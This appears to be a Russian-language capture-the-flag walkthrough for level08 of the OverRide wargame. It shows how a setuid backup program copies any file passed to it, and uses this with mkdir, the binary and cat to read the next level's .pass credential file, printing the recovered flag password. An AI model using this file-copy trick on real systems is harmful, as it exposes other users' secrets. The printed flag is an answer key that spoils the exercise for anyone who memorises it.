Дизассемблируя код видим, что программа 2 раза вызывает fopen, а затем open. 

Первый fopen пытается открыть ./backups/.log
Перейдем в папку tmp, в которой создадим папку backups, в ней файл .log.

level08@OverRide:/tmp$ /home/users/level08/level08
Usage: /home/users/level08/level08 filename
ERROR: Failed to open (null)

Также видим, что программа запрашивает аргумент, который представляет собой путь к файлу и служит аргументом для второго fopen.

После чего вызывается open, который в папке backups открывает файл, путь которого был задан в качестве аргумента программы.

Т.е. если запускаем программу со следующим аргументом:
level08@OverRide:/tmp$ ltrace ~/level08 test
То в папке backups программа будет пытаться найти и открыть данный файл:
open("./backups/test", 193, 0660)

level08@OverRide:/tmp$ /home/users/level08/level08 test
Когда запускаем программу с аргументом можно заметить, что файл, поданный в качестве аргумента копируется в папку backup со всем содержимым.

В качестве эксперимента в папкe tmp создадим папку test с файлом file и поместим туда некоторое содержимое. 
Далее создадим в папке backups папку tmp, в которой будет находится папка test (иначе программа выдает ошибку пытаясь открыть файл по пути ./backups/tmp/test

Далее запустим программу:
level08@OverRide:/tmp$ ~/level08 /tmp/test/file
После чего можно заметить, что по сути программа взяла содержимое из файла, путь которого подан в качестве аргумента и скопировала в
./backups + "путь в argv[1]".

Таким образом, чтобы узнать пароль:
1. Создадим папки:
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
2. Запустим программу из папки tmp с нужным аргументом:
level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
3. Получаем пароль:
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

